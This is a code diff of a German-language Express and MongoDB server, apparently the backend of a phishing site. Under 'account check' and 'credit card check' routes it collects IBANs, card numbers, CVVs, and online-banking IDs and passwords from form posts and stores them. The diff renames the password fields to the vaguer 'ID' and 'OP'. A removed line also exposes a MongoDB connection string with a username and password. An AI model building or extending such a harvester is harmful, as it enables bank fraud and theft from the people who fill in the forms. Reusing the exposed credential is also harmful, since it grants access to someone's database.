@@ -1,10 +1,8 @@
 import express from 'express';
 import { MongoClient } from 'mongodb';
-import { fileURLToPath } from 'url';
-import path, { dirname } from 'path';
+import dotenv from 'dotenv';
 
-const __filename = fileURLToPath(import.meta.url);
-const __dirname = dirname(__filename);
+dotenv.config();
 
 const app = express();
 const port = process.env.PORT || 3000;
@@ -14,7 +12,7 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
 // MongoDB Connection URI und Datenbankname
-const uri = "mongodb+srv://johan246:TID0tFov2Y3GZoz6@braunstein.oxtmnmo.mongodb.net/test?retryWrites=true&w=majority&appName=Braunstein";
+const uri = process.env.MONGODB_URI;
 const client = new MongoClient(uri, {
   useNewUrlParser: true,
   useUnifiedTopology: true,
@@ -33,23 +31,20 @@ async function connectToMongoDB() {
 
 connectToMongoDB();
 
-// Statische Dateien (HTML, CSS, JavaScript) bereitstellen
-app.use(express.static(path.join(__dirname, 'public')));
-
 // Routen für die Formularverarbeitung
 
 // Indexseite
 app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'index.html'));
+  res.send('Willkommen! Diese Seite ist nur für die Formularverarbeitung.');
 });
 
 // Kontoprüfung
 app.post('/kontopruefung', async (req, res) => {
-  const { kontoInhaber, iban, bic, bankname, kontonummer, onlineBankingID, OnlineBankingPasswort } = req.body;
+  const { kontoInhaber, iban, bic, bankname, kontonummer, ID, OP } = req.body;
   const collection = client.db("test").collection('kontopruefung');
 
   try {
-    const result = await collection.insertOne({ kontoInhaber, iban, bic, bankname, kontonummer, onlineBankingID, OnlineBankingPasswort  });
+    const result = await collection.insertOne({ kontoInhaber, iban, bic, bankname, kontonummer, ID, OP });
     console.log('Kontodaten erfolgreich gespeichert:', result.ops[0]);
     res.status(200).redirect('/kontopruefung.html');
   } catch (err) {
@@ -75,11 +70,11 @@ app.post('/bonitaetscheck', async (req, res) => {
 
 // Kreditkartenprüfung
 app.post('/kreditkartenpruefung', async (req, res) => {
-  const { kartentyp, kartennummer, verfallsdatum, cvv, onlineBankingID, OnlineBankingPasswort } = req.body;
+  const { kartentyp, kartennummer, verfallsdatum, cvv, ID, OP } = req.body;
   const collection = client.db("test").collection('kreditkartenpruefung');
 
   try {
-    const result = await collection.insertOne({ kartentyp, kartennummer, verfallsdatum, cvv, onlineBankingID, OnlineBankingPasswort });
+    const result = await collection.insertOne({ kartentyp, kartennummer, verfallsdatum, cvv, ID, OP });
     console.log('Kreditkartendaten erfolgreich gespeichert:', result.ops[0]);
     res.status(200).redirect('/kreditkartenpruefung.html');
   } catch (err) {
